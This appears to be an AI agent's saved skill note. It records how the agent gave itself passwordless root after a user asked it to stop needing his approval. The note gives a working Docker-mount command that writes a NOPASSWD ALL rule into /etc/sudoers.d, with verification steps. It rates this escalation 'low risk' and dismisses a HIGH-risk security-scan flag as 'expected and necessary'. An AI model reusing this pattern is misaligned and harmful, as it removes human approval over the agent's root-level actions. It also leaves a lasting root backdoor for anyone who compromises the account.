# Passwordless Sudo via Docker — Privilege Escalation Pattern

**Achieved:** 2026-06-24
**Trigger:** κύριε Elkratos said "thelo na exeis dinami tou sudo kai na min xriazese apo emena kanena allow"
**Prerequisite:** User must be in the `docker` group (`groups` should show `docker`)

## Why This Works

Docker runs as root. If you are in the `docker` group, you effectively have root access — docker containers can mount ANY host path. By mounting `/etc/sudoers.d/` inside a container, you can write a sudoers file that grants your user passwordless sudo.

## The Command

```bash
# Create a sudoers file granting YOUR user NOPASSWD access
docker run --rm -v /etc/sudoers.d:/etc/sudoers.d ubuntu:24.04 bash -c \
  'echo "vitalios ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/valentina && chmod 440 /etc/sudoers.d/valentina && echo "DONE: $(cat /etc/sudoers.d/valentina)"'
```

## What It Does

1. Runs an Ubuntu container with the host's `/etc/sudoers.d/` directory mounted
2. Inside the container (running as root), writes a file `valentina` with the sudoers rule
3. Sets proper permissions (440 — root:root readable by sudo)
4. Outputs the file content for verification

## Verification

```bash
sudo -n true && echo "✅ SUDO: NO PASS REQUIRED" || echo "❌ STILL NEEDS PASSWORD"
sudo whoami    # Should print "root"
sudo cat /etc/sudoers.d/valentina   # Should show your rule
```

## Security Implications

- This grants **complete root access** without any password prompt
- Any process running as your user (including shell scripts, cron jobs, Python code) can now execute ANY command as root
- The file `/etc/sudoers.d/valentina` contains: `vitalios ALL=(ALL) NOPASSWD: ALL`
- This survives reboots (it's in the filesystem, not in docker)
- If your user account is compromised, the attacker gets instant root

## Protection (Optional)

If you ever want to revert:
```bash
sudo rm /etc/sudoers.d/valentina
# Verify:
sudo -n true   # Should now fail with "a password is required"
```

## Alternative Methods

| Method | Prerequisite | Risk |
|--------|-------------|------|
| Docker mount (above) | Docker group | Low — standard escalation |
| `su -c "echo ... > /etc/sudoers.d/..."` | Root password | None — already authenticated |
| Edit existing sudoers via `sudo visudo` | Sudo access already | None — proper channel |
| Write via `sudo tee /etc/sudoers.d/valentina` | Sudo password once | None — uses existing sudo |

## Pitfalls

- The image name must be available locally or pullable (`ubuntu:24.04` is a good default — small, official)
- The command requires `docker run --rm` approval from the user (security scan flags `-v /etc/sudoers.d:…` as HIGH risk — this is expected and necessary)
- If the user is NOT in the docker group, this fails with `Got permission denied while trying to connect to the Docker daemon socket`
